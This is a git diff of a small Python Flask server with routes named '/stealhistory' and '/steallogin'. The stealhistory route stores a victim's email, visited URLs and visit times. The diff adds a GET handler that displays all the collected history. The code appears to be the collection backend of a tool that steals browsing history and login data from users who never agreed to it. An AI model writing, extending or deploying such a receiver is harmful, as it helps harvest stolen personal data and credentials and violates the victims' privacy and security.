@@ -9,7 +9,7 @@ def hello():
     return "Hello World!"
 
 
-@app.route("/stealhistory", methods=['POST'])
+@app.route("/stealhistory", methods=['POST', 'GET'])
 def stealhistory():
     if request.method == 'POST':
         email = request.form['email']
@@ -17,6 +17,9 @@ def stealhistory():
         time = request.form['last_visited']
         history.addToHistory(email, url, time)
         return "\n\n\nWe added to history: " + email
+    elif request.method == 'GET':
+        data = history.getHistory()
+        return render_template('history.html', data = data)
 
 @app.route("/steallogin", methods=['POST'])
 def steallogin():
